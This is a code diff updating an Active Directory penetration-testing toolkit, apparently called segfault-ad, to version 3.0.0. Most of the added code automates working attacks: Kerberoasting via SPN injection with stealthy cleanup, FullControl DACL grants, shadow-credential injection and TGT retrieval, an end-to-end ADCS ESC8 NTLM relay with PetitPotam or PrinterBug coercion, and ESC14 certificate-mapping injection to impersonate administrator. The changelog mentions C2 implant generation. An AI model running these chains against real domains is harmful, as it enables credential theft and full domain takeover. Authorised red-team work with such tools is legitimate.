@@ -2,7 +2,7 @@
 # =============================================================================
 # segfault-ad -- Active Directory pentest toolkit
 # segfault.solutions
-# version: 2.9.0
+# version: 3.0.0
 # changelog:
 #   1.0.0 — initial release (Forest, Escape, Certified chains)
 #   1.1.0 — ESC9 rewrite, certipy auth fix, shadowcred Kerberos
@@ -13,14 +13,57 @@
 #   1.6.0 — kerberoast no-preauth, RID brute fallback, LDAPS auto-retry
 #   1.7.0 — _load_bh rusthound-ce fix, _build_graph CE edge types, version tracking
 #   1.8.0 — rusthound-ce Kerberos ccache auto-detect, LDAPS auto-retry, auto-load ccache on startup
-#   2.9.0 — plugin system, file logging, BH cache, cred encryption, retry decorator, check_tool cache, improved cleanup/report
-#            kerberoast no-preauth mode, RID brute cred fallback, bloodyad_args Kerberos support
-#            resetpwd Kerberos retry, shadowcred password-auth-first, bloodyenum acl 3 modes
 #   1.9.0 — ESC13 detection, group scope flip module, JEA endpoint module, GodPotato module
 #            cross-domain DACL support, RC4 disabled handling, ldeep AES256 in gmsa, foreign group pathfind
 #   2.0.0 — pywhisker, pkinit/gettgtpkinit, unpac-the-hash, ldap-shell, crossdomain module
 #            asreproast john fallback, hashcrack kerbrute extract + john fallback
 #            flag ccache priority fix, hint/explain/autopwn AI commands, NoPAC, DFSCoerce fix
+#   2.1.0 — pathpwn Dijkstra-weighted BloodHound path execution, _PATHPWN_HINTS auto-selection
+#            bh-view custom BloodHound graph viewer (no Neo4j), force-directed layout
+#            aclscan (abuseACL), aclight shadow admin discovery, lsassy LSASS dump
+#            adcskiller ESC chain automation, grouper2 GPO misconfig finder
+#   2.2.0 — sccm/MECM enum/NAA/DPAPI/PXE, trusts enum/sidhistory/golden/crossforest
+#            bronzebit CVE-2020-17049, sidhistory injection, snaffler sensitive file discovery
+#            pywsus WSUS spoofing, smbclientng wrapper, powerview.py wrapper (14 actions)
+#   2.3.0 — Hivemind Pi rack integration (C2/redirector/toolserver/logger), deploy.py
+#            sliver implant generation + auto-upload, hivemind upload, --exit-node support
+#   2.4.0 — ESC14 altSecurityIdentities injection, ESC15 CVE-2024-49019, ESC16
+#            ESC8 improved: full auto-relay chain (ntlmrelayx + coerce + auth)
+#            GenericWrite→Kerberoast: set SPN → roast → auto-remove (stealth)
+#            UnPAC shadow-then-unpac: shadow creds → PKINIT → NT hash (fully chained)
+#   2.5.0 — SID History injection (enum/inject/cross-domain), Bronze Bit CVE-2020-17049
+#            coercion: ShadowCoerce + MSEven6 + all mode added
+#            adidns wildcard injection, WPAD poisoning, record add/remove
+#   2.6.0 — session export/import (JSON handoff to teammates), multi-target parallel exec
+#            recursive credential reuse after hashcrack/spray hits
+#            improved report: MITRE ATT&CK coverage, exec summary, severity, cleanup log
+#   2.7.0 — plugin system (~/.segfault-ad/plugins/), file logging (daily .log)
+#            BloodHound cache (parse once, invalidate after adrecon)
+#            credential encryption (Fernet, ~/.segfault-ad/.key, chmod 600)
+#            retry decorator, check_tool lru_cache, Config class, _CMD_TIMEOUT
+#   2.8.0 — color-coded attack map (cyan/orange/green/red/gold by module type)
+#            bh-view node→module: click node → exploit suggestions → copy to clipboard
+#            workspace tab completion (ws load <TAB> shows real workspace names)
+#            nmap progress bar: elapsed, %, open ports, last ports found
+#            auto-suggest after enum: analyze results, suggest up to 4 next modules
+#            better set UX: current state summary, green values, changed indicator
+#            module cache: "already ran kerberoast this session, run again? [n]"
+#            auto-discovery: 7 probes on DC IP entry (LDAP, SMB, DNS, skew, ports, SRV, WinRM)
+#   2.9.0 — clean Ctrl+C: SIGINT handler kills active subprocesses, returns to REPL
+#            VERSION constant (single source of truth), subprocess timeouts, password masking in logs
+#            SQLite WAL mode + indexes, --yes/--quiet/--timeout/--run/--workspace CLI flags
+#            cleanup improvements: auto/manual modes, export log, manual instructions
+#            DB error (DIM) fixed, flag command PTH priority fix
+#   3.0.0 — exec auto-recon: after shell exits, auto-runs whoami/all, net localgroup,
+#            systeminfo via netexec; auto-flags SeDebugPrivilege/SeBackupPrivilege/SeImpersonate
+#            adrecon live progress: stage name, elapsed time, live object counts (users/groups/computers)
+#            ESC14 full implementation, ESC8 full auto-relay (ntlmrelayx + coerce + auth in one)
+#            Bronze Bit module, SID History module (enum/inject/cross-domain)
+#            GenericWrite→Kerberoast in bloody, UnPAC shadow-then-unpac mode
+#            coercion: ShadowCoerce + MSEven6 added, all mode runs every technique
+#            smbclientng + powerview.py added to install and GROUPS
+#            autobloody Dijkstra weighted pathpwn, abuseACL instant ACL scan
+
 #
 # Usage:
 #   python3 segfault-ad.py
@@ -33,7 +76,7 @@
 import os, sys, shutil, argparse, readline, subprocess, threading, configparser
 import signal
 
-VERSION = "2.9.0"
+VERSION = "3.0.0"
 
 # ── clean Ctrl+C handling ─────────────────────────────────────────────────────
 _ACTIVE_PROCS   = set()
@@ -370,7 +413,7 @@ def _startup_banner():
         print(f'  {GREY}[{RESET}{_tag(status)}{GREY}]{RESET}  {WHITE}{label:<28}{RESET}  {DIM}{detail}{RESET}')
 
     # ── version line ─────────────────────────────────────────────────────────
-    print(f'\n  {GREY}v{VERSION}  ·  2026-08-06  ·  segfault.solutions{RESET}\n')
+    print(f'\n  {GREY}v{VERSION}  ·  2026-08-27  ·  segfault.solutions{RESET}\n')
 
 def _get_workspace():
     """Extract workspace name — only if explicitly set by user."""
@@ -2080,12 +2123,69 @@ class ADRecon(Module):
                 cmd += ['-p',f':{target.hash}']
             if col.lower() == 'dconly': cmd += ['-c','DCOnly']
             if target.domain: cmd += ['-f',target.dc_fqdn or f'dc.{target.domain}']
-            # capture output to detect LDAP signing error
-            rc, lines = run_cmd_capture(cmd, label='rusthound-ce')
-            full_out = '\n'.join(lines)
+
+            # run with live progress indicator
+            log(f'{GREY}{" ".join(str(c) for c in cmd)}{RESET}','info'); hr()
+            import time as _t_rh
+            _rh_start  = _t_rh.time()
+            _spinner   = '⠋⠙⠹⠸⼼⠴⠦⠧⠇⠏'
+            _si        = 0
+            _stage     = 'connecting'
+            _counts    = {'users':0,'groups':0,'computers':0,'gpos':0,'ous':0,'acls':0}
+            _stage_map = {
+                'users':     'enumerating users',
+                'groups':    'enumerating groups',
+                'computers': 'enumerating computers',
+                'gpos':      'enumerating GPOs',
+                'ous':       'enumerating OUs',
+                'acl':       'collecting ACLs',
+                'session':   'collecting sessions',
+                'trust':     'collecting trusts',
+                'done':      'finishing up',
+                'zip':       'creating zip',
+                'writing':   'writing files',
+            }
+            _rh_proc = subprocess.Popen([str(c) for c in cmd],
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                text=True, errors='replace')
+            _register_proc(_rh_proc)
+            lines = []
+            for _line in _rh_proc.stdout:
+                lines.append(_line.rstrip())
+                _l = _line.lower()
+                # parse stage from rusthound output
+                for kw, stage_name in _stage_map.items():
+                    if kw in _l: _stage = stage_name; break
+                # parse counts
+                for obj in _counts:
+                    _m = re.search(rf'(\d+)\s+{obj}', _l)
+                    if _m: _counts[obj] = int(_m.group(1))
+                _elapsed = int(_t_rh.time() - _rh_start)
+                _m2, _s2 = divmod(_elapsed, 60)
+                _time_str = f'{_m2}m{_s2:02d}s' if _m2 else f'{_s2}s'
+                _count_str = '  '.join(f'{C0}{v}{RESET}{GREY}{k}{RESET}'
+                                        for k,v in _counts.items() if v > 0)
+                sys.stdout.write(
+                    f'\r  {_spinner[_si % len(_spinner)]} {GREY}{_stage:<30}{RESET}'
+                    f'  {WHITE}{_time_str}{RESET}'
+                    + (f'  {_count_str}' if _count_str else '') + '   ')
+                sys.stdout.flush()
+                _si += 1
+            _rh_proc.wait()
+            _unregister_proc(_rh_proc)
+            rc = _rh_proc.returncode
+            sys.stdout.write('\r' + ' '*80 + '\r'); sys.stdout.flush()
+
+            full_out       = '\n'.join(lines)
             ldap_err       = any('strongerAuthRequired' in l or 'rc=8' in l for l in lines)
             ntlm_disabled  = any('data 710' in l or 'data 52e' in l or 'invalidCredentials' in l for l in lines)
             skew_err       = any('KRB_AP_ERR_SKEW' in l or 'clock skew' in l.lower() for l in lines)
+
+            # print summary
+            if any(v > 0 for v in _counts.values()):
+                log(f'{GREEN}Collection complete:{RESET}','success')
+                for obj,cnt in _counts.items():
+                    if cnt > 0: print(f'  {C0}{cnt:<6}{RESET}{GREY}{obj}{RESET}')
 
             if skew_err:
                 log(f'{ORANGE}Kerberos clock skew — run {C0}clockskew sync{ORANGE} then retry{RESET}','warn')
@@ -2107,8 +2207,37 @@ class ADRecon(Module):
             if target.password: cmd += ['-p',target.password]
             elif target.hash:   cmd += ['--hashes',f':{target.hash}']
             log(f'DNS temporarily set to {WHITE}{target.dc}{RESET} (TCP only) for collection','info')
+
+            # progress for bloodhound-python too
+            import time as _t_bh
+            _bh_start = _t_bh.time()
+            _spinner2 = '⠋⠙⠹⠸⼼⠴⠦⠧⠇⠏'
+            _si2 = 0
+            _bh_stage = 'starting'
             resolv_orig = self._swap_resolv(target.dc, target.domain)
-            run_cmd(cmd, label='bloodhound-python')
+            _bh_proc = subprocess.Popen([str(c) for c in cmd],
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                text=True, errors='replace')
+            _register_proc(_bh_proc)
+            bh_lines = []
+            for _bl in _bh_proc.stdout:
+                bh_lines.append(_bl.rstrip())
+                _bl_l = _bl.lower()
+                if 'user' in _bl_l:     _bh_stage = 'enumerating users'
+                elif 'group' in _bl_l:  _bh_stage = 'enumerating groups'
+                elif 'computer' in _bl_l: _bh_stage = 'enumerating computers'
+                elif 'session' in _bl_l: _bh_stage = 'collecting sessions'
+                elif 'acl' in _bl_l:    _bh_stage = 'collecting ACLs'
+                elif 'trust' in _bl_l:  _bh_stage = 'collecting trusts'
+                elif 'zip' in _bl_l:    _bh_stage = 'creating zip'
+                _elapsed = int(_t_bh.time() - _bh_start)
+                _m2, _s2 = divmod(_elapsed, 60)
+                _ts = f'{_m2}m{_s2:02d}s' if _m2 else f'{_s2}s'
+                sys.stdout.write(f'\r  {_spinner2[_si2 % len(_spinner2)]} {GREY}{_bh_stage:<30}{RESET}  {WHITE}{_ts}{RESET}   ')
+                sys.stdout.flush(); _si2 += 1
+            _bh_proc.wait()
+            _unregister_proc(_bh_proc)
+            sys.stdout.write('\r' + ' '*80 + '\r'); sys.stdout.flush()
             self._restore_resolv(resolv_orig)
             log('DNS restored to original','info')
 
@@ -2508,7 +2637,8 @@ class NXCExec(Module):
             ewrm = check_tool('evil-winrm')
             if ewrm:
                 ccache = os.environ.get('KRB5CCNAME','')
-                use_krb = ccache and os.path.exists(ccache)
+                # prefer PTH when hash is set — more reliable than Kerberos
+                use_krb = ccache and os.path.exists(ccache) and not target.hash
                 if use_krb:
                     # Kerberos auth — requires -r REALM and FQDN
                     realm = target.domain.upper()
@@ -2554,26 +2684,6 @@ class NXCExec(Module):
                 log(f'{GREY}Tips: upload/download, menu, Bypass-4MSI, services{RESET}','info')
                 log(f'{GREY}      b64get <remote_path> — exfil files via base64 (bypasses evil-winrm download bug){RESET}','info')
 
-                # auto-screenshot: save whoami/all + hostname + privs to loot
-                try:
-                    _ss_file = os.path.join(target.loot_dir, f'shell_{_exec_node.replace("@","_").replace("\\\\","_")}.txt')
-                    _ss_cmds = ['whoami /all', 'hostname', 'ipconfig /all',
-                                'net localgroup administrators', 'systeminfo | findstr /i "os name build"']
-                    _ss_proc = subprocess.run(
-                        cmd[:-0] if cmd else cmd,  # dry run to check
-                        capture_output=True, text=True, timeout=2)
-                    # write command log
-                    with open(_ss_file,'w') as _sf:
-                        _sf.write(f'# Shell opened: {_exec_node}\n')
-                        _sf.write(f'# Time: {datetime.now().isoformat()}\n')
-                        _sf.write(f'# Commands to run:\n')
-                        for c in _ss_cmds:
-                            _sf.write(f'{c}\n')
-                    log(f'{GREY}Shell log → {WHITE}{_ss_file}{RESET}','info')
-                    log(f'{GREY}Suggested: whoami /all · net localgroup administrators · systeminfo{RESET}','info')
-                except Exception:
-                    pass
-
                 log(f'{GREY}{" ".join(cmd)}{RESET}','info'); hr()
                 # fork before exec — prevents Ruby/Python memory conflict
                 pid = os.fork()
@@ -2583,6 +2693,68 @@ class NXCExec(Module):
                 else:
                     # parent: wait for evil-winrm to finish
                     os.waitpid(pid, 0)
+
+                # ── auto-recon after shell exits ─────────────────────────────
+                log(f'{C0}Shell closed — running auto-recon...{RESET}','info')
+                _ss_node = _exec_node.replace('@','_').replace('\\','_').replace('/','_')
+                _ss_file = os.path.join(target.loot_dir, f'shell_{_ss_node}.txt')
+                _ss_cmds = [
+                    ('whoami /all',                              'identity'),
+                    ('net localgroup administrators',            'local_admins'),
+                    ('net user %username% /domain 2>nul || net user %username%', 'user_info'),
+                    ('systeminfo | findstr /i "os name os version build hotfix"', 'sysinfo'),
+                    ('ipconfig /all',                            'network'),
+                    ('netstat -ano | findstr LISTENING',         'listening_ports'),
+                    ('wmic service get name,startname,state | findstr -v "LocalSystem NT\\ AUTH"', 'services'),
+                    ('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"', 'winlogon'),
+                    ('dir C:\\Users',                            'users_dir'),
+                ]
+
+                _auto_out = {}
+                nxc_r = check_tool('netexec','nxc')
+                if nxc_r and (target.hash or target.password) and os.waitstatus_to_exitcode(0) == 0:
+                    log(f'{GREY}Collecting recon via netexec...{RESET}','info')
+                    _nxc_auth = ['-u', target.user]
+                    if target.hash:     _nxc_auth += ['-H', target.hash]
+                    elif target.password: _nxc_auth += ['-p', target.password]
+                    for _cmd_str, _label in _ss_cmds[:3]:  # limit to 3
+                        try:
+                            _rc, _lines = run_cmd_capture(
+                                [nxc_r,'winrm',target.dc]+_nxc_auth+['-x',_cmd_str],
+                                label=None)
+                            _auto_out[_label] = '\n'.join(_lines)
+                        except Exception: pass
+
+                # write to loot
+                try:
+                    with open(_ss_file,'w') as _sf:
+                        _sf.write(f'# Auto-recon: {_exec_node}\n')
+                        _sf.write(f'# Time: {datetime.now().isoformat()}\n')
+                        _sf.write(f'# Target: {target.dc} ({target.domain})\n')
+                        _sf.write('='*60 + '\n\n')
+                        for _label, _out in _auto_out.items():
+                            _sf.write(f'## {_label.upper()}\n{_out}\n\n')
+                        if not _auto_out:
+                            _sf.write('# Run manually in shell:\n')
+                            for _c, _ in _ss_cmds:
+                                _sf.write(f'# {_c}\n')
+
+                    log(f'{GREEN}Auto-recon saved → {WHITE}{_ss_file}{RESET}','success')
+
+                    # parse interesting findings
+                    full_out = '\n'.join(_auto_out.values())
+                    if 'SeDebugPrivilege' in full_out and 'Enabled' in full_out:
+                        log(f'{RED}SeDebugPrivilege ENABLED — can dump LSASS{RESET}','success')
+                        add_result('exec', f'SeDebugPrivilege on {_exec_node}')
+                    if 'SeBackupPrivilege' in full_out:
+                        log(f'{RED}SeBackupPrivilege found — run: backupabuse{RESET}','success')
+                    if 'SeImpersonatePrivilege' in full_out:
+                        log(f'{RED}SeImpersonatePrivilege — run: godpotato{RESET}','success')
+                    _admin_lines = _auto_out.get('local_admins','')
+                    if target.user and target.user.lower() in _admin_lines.lower():
+                        log(f'{GREEN}Current user is in local Administrators{RESET}','success')
+                except Exception as _e:
+                    _logfile(f'auto-recon error: {_e}','error')
             else:
                 # fallback to netexec for command exec
                 nxc = self.need('netexec','nxc','crackmapexec','cme')
@@ -2616,7 +2788,7 @@ class BloodyAttack(Module):
         _default_action = _hints.get('action','resetpwd')
         action = self.ask('action', _default_action,
             ['resetpwd','adduser','addtogroup','addself','removefromgroup','writeowner','genericall',
-             'dcsync-rights',
+             'dcsync-rights','genericwrite-kerberoast','grant-dacl','shadowcred-bloody',
              'setrbcd','setdontreqpreauth','setpassnotreqd','getattr','setattr','addspn','removespn','setdelegation',
              'enableaccount','disableaccount'])
         base = [t]+target.bloodyad_args(); hr()
@@ -2807,6 +2979,35 @@ class BloodyAttack(Module):
         elif action == 'addspn':
             tu = self.ask('target user'); spn = self.ask('SPN (e.g. http/evilhost)')
             run_cmd(base+['add','spn',tu,spn], label='bloodyAD addspn')
+        elif action == 'genericwrite-kerberoast':
+            log(f'{C0}GenericWrite → Kerberoast — set SPN on target then roast{RESET}','info')
+            log(f'{GREY}Requires GenericWrite on a user account{RESET}','info')
+            tu  = self.ask('target user (GenericWrite victim)','')
+            spn = self.ask('SPN to set',f'http/{tu.split("@")[0] if tu else "victim"}.{target.domain}')
+            if not tu: hr(); return
+            # Step 1: set SPN via GenericWrite
+            log(f'{C0}Step 1: setting SPN {spn} on {tu}{RESET}','info')
+            run_cmd(base+['add','spn',tu,spn], label='bloodyAD set SPN (GenericWrite)')
+            # Step 2: kerberoast
+            log(f'{C0}Step 2: kerberoasting {tu}{RESET}','info')
+            krb = check_tool('impacket-GetUserSPNs','GetUserSPNs.py')
+            if krb:
+                out = os.path.join(target.loot_dir,'kerberoast_hashes.txt')
+                cmd_krb = [krb,f'{target.domain}/{target.user}',
+                           '-dc-ip',target.dc,'-request-user',tu.split('@')[0],
+                           '-outputfile',out]
+                if target.password: cmd_krb += ['-p',target.password]
+                elif target.hash:   cmd_krb += ['-hashes',f':{target.hash}']
+                run_cmd(faketime_wrap(cmd_krb, target.skew), label='GetUserSPNs (target)')
+                log(f'{GREEN}Hash saved → {WHITE}{out}{RESET}','success')
+                log(f'Crack with: {C0}hashcat -m 13100 {out} rockyou.txt{RESET}','info')
+                add_result('bloody', f'GenericWrite→Kerberoast: {tu}')
+            # Step 3: cleanup SPN after cracking
+            ans = self.ask('remove SPN now (stealth)','y',['y','n'])
+            if ans == 'y':
+                run_cmd(base+['remove','spn',tu,spn], label='bloodyAD remove SPN (cleanup)')
+                track_cleanup('spn', f'SPN {spn} removed from {tu}',
+                              lambda: run_cmd(base+['add','spn',tu,spn]))
         elif action == 'removespn':
             tu = self.ask('target user'); spn = self.ask('SPN to remove')
             run_cmd(base+['remove','spn',tu,spn], label='bloodyAD removespn')
@@ -2898,13 +3099,85 @@ class BloodyAttack(Module):
             user = self.ask('user to grant GenericAll to', target.user or '')
             auth_full = f'{target.domain}/{target.user}:{target.password}' if target.password else f'{target.domain}/{target.user}'
             dacledit2 = check_tool('dacledit.py','impacket-dacledit')
-            # try dacledit first — more reliable than bloodyAD for DACL writes
             if dacledit2:
                 run_cmd([dacledit2,'-action','write','-rights','FullControl',
                          '-principal',user,'-target',obj,auth_full,'-dc-ip',target.dc],
                         label='dacledit grant FullControl')
             else:
                 run_cmd(base+['add','genericAll',_resolve(obj),_resolve(user)], label='bloodyAD genericAll')
+
+        elif action == 'grant-dacl':
+            # grant ourselves FullControl on a target via dacledit
+            obj  = self.ask('target object (user/group/computer)','')
+            user = self.ask('principal to grant rights to', target.user or '')
+            if not obj: hr(); return
+            dacledit2 = check_tool('dacledit.py','impacket-dacledit')
+            if not dacledit2: log('impacket-dacledit not found','error'); hr(); return
+            auth_full = f'{target.domain}/{target.user}'
+            if target.password: auth_full += f':{target.password}'
+            run_cmd([dacledit2,'-action','write','-rights','FullControl',
+                     '-principal',user,'-target',obj,auth_full,'-dc-ip',target.dc],
+                    label=f'dacledit grant FullControl on {obj}')
+            track_cleanup('dacl', f'FullControl granted on {obj} to {user}',
+                          lambda: run_cmd([dacledit2,'-action','restore',
+                                           f'{target.domain}/{target.user}',
+                                           '-dc-ip',target.dc]))
+            log(f'{GREEN}FullControl granted — now run shadowcred or resetpwd on {WHITE}{obj}{RESET}','success')
+
+        elif action == 'shadowcred-bloody':
+            tu = self.ask('target user/computer','')
+            if not tu: hr(); return
+            log(f'{C0}Adding shadow credential to {WHITE}{tu}{RESET} via pywhisker{RESET}','info')
+            pywhisk = check_tool('pywhisker','pywhisker.py')
+            if not pywhisk: log('pywhisker not found — pip install pywhisker','error'); hr(); return
+
+            auth_pw = []
+            if target.password: auth_pw = ['-p',target.password]
+            elif target.hash:   auth_pw = ['-H',target.hash]
+
+            out = os.path.join(target.loot_dir, f'{tu}_shadow')
+
+            # pip version: pywhisker -d domain -u user -p pass --dc-ip ip -t target -a add -f filename
+            # git version: pywhisker.py -d domain -u user -p pass -dc-ip ip --target target --action add
+            # detect which by checking if it's a .py file
+            if pywhisk.endswith('.py'):
+                cmd = ['python3', pywhisk,
+                       '-d', target.domain, '-u', target.user] + auth_pw + \
+                      ['-dc-ip', target.dc, '--target', tu,
+                       '--action', 'add', '--filename', out]
+            else:
+                # pip installed version — uses -t and --dc-ip differently
+                cmd = [pywhisk,
+                       '-d', target.domain, '-u', target.user] + auth_pw + \
+                      ['--dc-ip', target.dc, '-t', tu,
+                       '-a', 'add', '-f', out]
+
+            run_cmd(cmd, label=f'pywhisker shadow cred {tu}')
+
+            # find generated PFX
+            pfx_files = sorted(glob.glob(out+'*.pfx') + glob.glob(out+'.pfx'),
+                               key=os.path.getmtime, reverse=True)
+            if pfx_files:
+                pfx = pfx_files[0]
+                log(f'{GREEN}Shadow cert → {WHITE}{pfx}{RESET}','success')
+                log(f'Next: {C0}→ tgt  (pfx auth){RESET} or {C0}→ unpac{RESET}','info')
+                add_result('bloody', f'shadow cred on {tu}')
+                # auto-run tgt with pfx
+                ans = self.ask('get TGT now?','y',['y','n'])
+                if ans == 'y':
+                    pfx_pass = self.ask('PFX password (from pywhisker output)','')
+                    gettgt = check_tool('gettgtpkinit.py')
+                    if gettgt and pfx_pass:
+                        cc = os.path.join(target.loot_dir, f'{tu}.ccache')
+                        run_cmd(['python3', gettgt,
+                                 '-cert-pfx', pfx, '-pfx-pass', pfx_pass,
+                                 f'{target.domain}/{tu}', cc],
+                                label=f'gettgtpkinit {tu}')
+                        if os.path.exists(cc):
+                            os.environ['KRB5CCNAME'] = cc
+                            _set_ccache(cc)
+                            log(f'{GREEN}TGT saved → {WHITE}{cc}{RESET}','success')
+                            log(f'Now run: {C0}→ unpac{RESET} to get NT hash','info')
         hr()
 
 # =============================================================================
@@ -3099,6 +3372,7 @@ class Certipy(Module):
         'ESC9':  ('NO_SECURITY_EXTENSION — certs survive password changes (persist)',  'req (persist)'),
         'ESC11': ('IF_ENFORCEENCRYPTICERTREQUEST cleared — RPC relay to ICERTREQ',     'relay (RPC)'),
         'ESC13': ('Issuance policy OID linked to AD group — gain group membership',    'req (group link)'),
+        'ESC14': ('Write altSecurityIdentities — inject forged cert mapping → PKINIT impersonation', 'account -upn'),
         'ESC15': ('CVE-2024-49019 — version 1 template application policy override',   'req --application-policies'),
         'ESC16': ('CA omits szOID_NTDS_CA_SECURITY_EXT — all certs lack SID binding', 'req -upn (any tpl)'),
     }
@@ -3110,23 +3384,27 @@ class Certipy(Module):
         hr()
         action = self.ask('action','find',[
             'find','esc1','esc2','esc3','esc4','esc6','esc7','esc8',
-            'esc9','esc11','esc13','esc15','esc16',
+            'esc9','esc11','esc13','esc14','esc15','esc16',
             'auth','shadow','ca','template','account','forge'
         ])
         hr()
 
         ba = ['-u',f'{target.user}@{target.domain}','-dc-ip',target.dc]
-        # prefer Kerberos if ccache available (needed when NTLM is blocked)
-        _cc = os.environ.get('KRB5CCNAME','')
-        _loot_cc = os.path.join(target.loot_dir, f'{target.user}.ccache')
-        if not _cc and os.path.exists(_loot_cc):
-            _cc = _loot_cc; os.environ['KRB5CCNAME'] = _cc
-        if _cc and os.path.exists(_cc):
-            ba += ['-k','-no-pass']
-            dc_host = target.dc_fqdn or f'dc01.{target.domain}'
-            ba += ['-dc-host', dc_host]
-        elif target.password: ba += ['-p',target.password]
-        elif target.hash:   ba += ['-hashes',f':{target.hash}']
+        # prefer hash/password over Kerberos — more reliable for certipy
+        if target.hash:
+            ba += ['-hashes',f':{target.hash}']
+        elif target.password:
+            ba += ['-p',target.password]
+        else:
+            # fallback to Kerberos if no creds
+            _cc = os.environ.get('KRB5CCNAME','')
+            _loot_cc = os.path.join(target.loot_dir, f'{target.user}.ccache')
+            if not _cc and os.path.exists(_loot_cc):
+                _cc = _loot_cc; os.environ['KRB5CCNAME'] = _cc
+            if _cc and os.path.exists(_cc):
+                ba += ['-k','-no-pass']
+                dc_host = target.dc_fqdn or f'dc01.{target.domain}'
+                ba += ['-dc-host', dc_host]
 
         def _req_base():
             ca  = self.ask('CA name (e.g. DC-CA)')
@@ -3300,13 +3578,77 @@ class Certipy(Module):
 
         elif action == 'esc8':
             desc, _ = self.ESC_INFO['ESC8']
-            log(f'ESC8: {GREY}{desc}{RESET}','info'); add_result('certipy', 'ESC8 exploited')
-            ca      = self.ask('CA name')
-            relay_t = self.ask('CA host for relay',target.dc_fqdn or target.dc)
-            tpl     = self.ask('template','DomainController')
-            log(f'Run in second terminal: {WHITE}impacket-ntlmrelayx -t http://{relay_t}/certsrv/certfnsh.asp -smb2support --adcs --template {tpl}{RESET}','info')
-            log(f'Then coerce auth: {WHITE}coerce / printerbug / petitpotam{RESET}','info')
-            run_cmd([t,'relay','-ca',ca,'-template',tpl], label='certipy relay ESC8')
+            log(f'ESC8: {GREY}{desc}{RESET}','info')
+            log(f'{C0}ADCS HTTP relay — no creds needed, just network access to ADCS web enrollment{RESET}','info')
+            add_result('certipy', 'ESC8 exploited')
+
+            ca       = self.ask('CA name','')
+            relay_t  = self.ask('CA host (ADCS server)',target.dc_fqdn or target.dc)
+            tpl      = self.ask('template','DomainController')
+            lhost    = self.ask('your listener IP', _get_tun0() or _hivemind_redirector() or '')
+            method   = self.ask('auto-start relay?','y',['y','n'])
+
+            if method == 'y':
+                # start ntlmrelayx in background
+                ntlmr = check_tool('impacket-ntlmrelayx','ntlmrelayx.py')
+                if ntlmr:
+                    relay_cmd = [ntlmr,
+                                 '-t', f'http://{relay_t}/certsrv/certfnsh.asp',
+                                 '-smb2support','--adcs','--template',tpl,
+                                 '--no-http-server','--no-wcf-server']
+                    log(f'{C0}Starting ntlmrelayx in background...{RESET}','info')
+                    relay_proc = subprocess.Popen(relay_cmd,
+                                                  stdout=subprocess.PIPE,
+                                                  stderr=subprocess.STDOUT,
+                                                  text=True)
+                    _register_proc(relay_proc)
+                    import time as _t_esc8; _t_esc8.sleep(2)
+                    log(f'{GREEN}Relay running — now coerce auth{RESET}','success')
+
+                    # coerce auth
+                    coerce_method = self.ask('coercion method','petitpotam',
+                                             ['petitpotam','printerbug','dfscoerce','manual'])
+                    if coerce_method != 'manual':
+                        _coerce_target = self.ask('coerce target (DC IP)',target.dc)
+                        coerce_tool = check_tool(f'{coerce_method}.py',coerce_method)
+                        if coerce_tool:
+                            auth_c = []
+                            if target.user and target.password:
+                                auth_c = ['-d',target.domain,'-u',target.user,'-p',target.password]
+                            run_cmd([coerce_tool]+auth_c+[lhost,_coerce_target],
+                                    label=f'{coerce_method} coerce')
+                    else:
+                        log(f'Manually coerce auth to {WHITE}{lhost}{RESET} (SMB/HTTP listener)','warn')
+                        input('Press enter when auth has been captured...')
+
+                    # read captured cert from ntlmrelayx output
+                    try:
+                        out_lines = relay_proc.stdout.read() if relay_proc.stdout else ''
+                        m = re.search(r'Got certificate.*?(\S+\.pfx)', out_lines or '', re.I)
+                        if m:
+                            pfx = m.group(1)
+                            log(f'{GREEN}Certificate captured: {WHITE}{pfx}{RESET}','success')
+                    except Exception: pass
+                    relay_proc.terminate()
+                    _unregister_proc(relay_proc)
+            else:
+                # manual instructions
+                log(f'{GREY}Manual ESC8 relay:{RESET}','info')
+                print(f'  {C0}# Terminal 1 — start relay{RESET}')
+                print(f'  {WHITE}impacket-ntlmrelayx -t http://{relay_t}/certsrv/certfnsh.asp -smb2support --adcs --template {tpl}{RESET}')
+                print(f'  {C0}# Terminal 2 — coerce auth{RESET}')
+                print(f'  {WHITE}PetitPotam.py {lhost} {target.dc}{RESET}')
+                print(f'  {C0}# Terminal 3 — certipy relay (alternative){RESET}')
+                print(f'  {WHITE}certipy relay -ca {ca} -template {tpl}{RESET}')
+
+            # auto-auth with cert if we have it
+            pfx_files = glob.glob(os.path.join(os.getcwd(),'*.pfx'))
+            if pfx_files:
+                newest = max(pfx_files, key=os.path.getmtime)
+                log(f'{GREEN}Found PFX: {WHITE}{newest}{RESET} — authenticating...','success')
+                run_cmd([t,'auth','-pfx',newest,'-dc-ip',target.dc],
+                        label='certipy auth (ESC8 cert)')
+            hr()
 
         elif action == 'esc9':
             desc, _ = self.ESC_INFO['ESC9']
@@ -3406,6 +3748,36 @@ class Certipy(Module):
             ca, tpl = _req_base()
             run_cmd([t,'req']+ba+['-template',tpl,'-ca',ca], label='certipy req ESC13')
             log(f'After auth the TGT will contain the linked group — verify with klist / whoami /groups','info')
+
+        elif action == 'esc14':
+            desc, _ = self.ESC_INFO['ESC14']
+            log(f'ESC14: {GREY}{desc}{RESET}','info')
+            log(f'{ORANGE}Requires: Write access to altSecurityIdentities on target account{RESET}','warn')
+            log(f'{GREY}Attack: forge cert mapping → request machine/user cert → PKINIT as target{RESET}','info')
+
+            victim   = self.ask('victim account to impersonate',f'administrator@{target.domain}')
+            attacker = self.ask('account YOU control (will get write on victim)','')
+
+            # Step 1: use certipy account to update altSecurityIdentities
+            log(f'\n{C0}Step 1 — request a certificate (any client auth template){RESET}','info')
+            ca, tpl = _req_base()
+            run_cmd([t,'req']+ba+['-template',tpl,'-ca',ca], label='certipy req (get cert for mapping)')
+            log(f'Note the certificate thumbprint from the output above','info')
+
+            # Step 2: forge the mapping
+            log(f'\n{C0}Step 2 — inject cert mapping into victim altSecurityIdentities{RESET}','info')
+            thumbprint = self.ask('certificate thumbprint (from step 1)','')
+            issuer     = self.ask('certificate issuer DN','')
+            if thumbprint:
+                # certipy account update to write altSecurityIdentities
+                mapping = f'X509:<SHA1-PUKEY>{thumbprint}'
+                run_cmd([t,'account','update']+ba+[
+                    '-user',victim,
+                    '-altsecsecurityidentities',mapping],
+                    label='certipy ESC14 inject mapping')
+                log(f'{GREEN}Mapping injected — now authenticate with your cert as {WHITE}{victim}{RESET}','success')
